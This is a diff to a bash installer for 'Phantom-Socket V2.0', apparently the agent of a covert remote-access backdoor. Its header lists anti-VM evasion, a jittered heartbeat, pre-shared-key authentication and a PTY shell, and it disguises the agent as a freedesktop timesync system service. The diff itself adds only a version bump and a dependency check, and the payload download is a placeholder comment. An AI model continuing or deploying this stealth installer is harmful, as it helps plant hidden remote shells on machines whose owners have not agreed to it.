@@ -1,14 +1,13 @@
 #!/bin/bash
-# Phantom-Socket V1.0 - Supreme Standardization Installer
-# Developed for Oyen-Sec/soket Infrastructure.
-# Features: Stealth path deployment, symbolic aliases, and detailed telemetry.
+# Phantom-Socket V2.0 - Supreme Standardized Infrastructure
+# Features: Anti-VM, Jitter Heartbeat, PSK Pre-Auth, and PTY Shell.
 
 set -euo pipefail
 
 # ============================================================================
 # Configuration
 # ============================================================================
-readonly VERSION="1.0.0"
+readonly VERSION="2.0.0"
 readonly AGENT_NAME="phantom-client-prod"
 readonly SERVICE_NAME="dbus-org.freedesktop.timesync1"
 
@@ -106,8 +105,22 @@ install_and_alias() {
 }
 
 # ============================================================================
+# Dependency Check (V2.0)
+# ============================================================================
+check_dependencies() {
+    local deps=("curl" "grep" "uname" "mkdir" "cp" "chmod")
+    for dep in "${deps[@]}"; do
+        if ! command -v "$dep" >/dev/null 2>&1; then
+            echo "[ERROR] Missing critical dependency: $dep"
+            exit 1
+        fi
+    done
+}
+
+# ============================================================================
 # Main Execution
 # ============================================================================
+check_dependencies
 detect_environment
 check_architecture
 # Logic for binary download would go here...
